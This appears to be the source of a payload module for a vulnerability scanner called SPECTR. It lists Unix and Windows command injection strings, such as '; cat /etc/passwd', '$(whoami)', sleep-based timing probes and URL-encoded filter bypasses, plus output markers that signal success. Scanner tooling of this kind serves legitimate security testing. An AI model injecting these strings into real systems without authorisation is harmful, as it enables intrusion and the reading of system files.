"""Command injection payloads for SPECTR scanner"""

class CommandInjectionPayloads:
    """Collection of command injection payloads"""

    # Basic command injection payloads
    BASIC_PAYLOADS = [
        "; whoami",
        "&& whoami",
        "| whoami",
        "`whoami`",
        "$(whoami)",
        "; id",
        "&& id",
        "| id",
        "`id`",
        "$(id)",
        "; pwd",
        "&& pwd",
        "| pwd",
        "`pwd`",
        "$(pwd)",
        "; ls",
        "&& ls",
        "| ls",
        "`ls`",
        "$(ls)",
        "; cat /etc/passwd",
        "&& cat /etc/passwd",
        "| cat /etc/passwd",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "; uname -a",
        "&& uname -a",
        "| uname -a",
        "`uname -a`",
        "$(uname -a)",
        "; echo vulnerable",
        "&& echo vulnerable",
        "| echo vulnerable",
        "`echo vulnerable`",
        "$(echo vulnerable)",
        "; whoami; ls",
        "&& whoami && ls",
        "| whoami | ls",
        "`whoami; ls`",
        "$(whoami; ls)",
        "; id; pwd",
        "&& id && pwd",
        "| id | pwd",
        "`id; pwd`",
        "$(id; pwd)",
        "; sleep 5",
        "&& sleep 5",
        "| sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
    ]

    # Time-based payloads
    TIME_BASED_PAYLOADS = [
        "; sleep 5",
        "&& sleep 5", 
        "| sleep 5"
    ]

    # Windows-specific payloads
    WINDOWS_PAYLOADS = [
        "& whoami",
        "| whoami",
        "`whoami`",
        "$(whoami)",
        "& dir",
        "| dir",
        "`dir`",
        "$(dir)",
        "& echo vulnerable",
        "| echo vulnerable",
        "`echo vulnerable`",
        "$(echo vulnerable)",
        "& whoami & dir",
        "| whoami | dir",
        "`whoami & dir`",
        "$(whoami & dir)",
        "& echo test",
        "| echo test",
        "`echo test`",
        "$(echo test)",
        "& ver",
        "| ver",
        "`ver`",
        "$(ver)",
        "& systeminfo",
        "| systeminfo",
        "`systeminfo`",
        "$(systeminfo)",
        "& hostname",
        "| hostname",
        "`hostname`",
        "$(hostname)",
        "& tasklist",
        "| tasklist",
        "`tasklist`",
        "$(tasklist)",
        "& set",
        "| set",
        "`set`",
        "$(set)",
        "& echo %USERNAME%",
        "| echo %USERNAME%",
        "`echo %USERNAME%`",
        "$(echo %USERNAME%)",
        "& echo %COMPUTERNAME%",
        "| echo %COMPUTERNAME%",
        "`echo %COMPUTERNAME%`",
        "$(echo %COMPUTERNAME%)",
        "& echo %USERDOMAIN%",
        "| echo %USERDOMAIN%",
        "`echo %USERDOMAIN%`",
        "$(echo %USERDOMAIN%)"
     ]
    
    BYPASS_PAYLOADS = [
    "%3B whoami",
    "%26%26 whoami", 
    "%7C whoami",
    "\\n whoami",
    "\\r\\n whoami",
    "%0a whoami"
        ]


    @classmethod
    def get_all_payloads(cls):
        """Get all command injection payloads"""
        return cls.BASIC_PAYLOADS + cls.TIME_BASED_PAYLOADS + cls.WINDOWS_PAYLOADS

    @classmethod
    def get_success_indicators(cls):
        """Get indicators that suggest successful command injection"""
        return [
            "uid=",
            "gid=", 
            "groups=",
            "/bin/",
            "/usr/",
            "/home/"
        ]
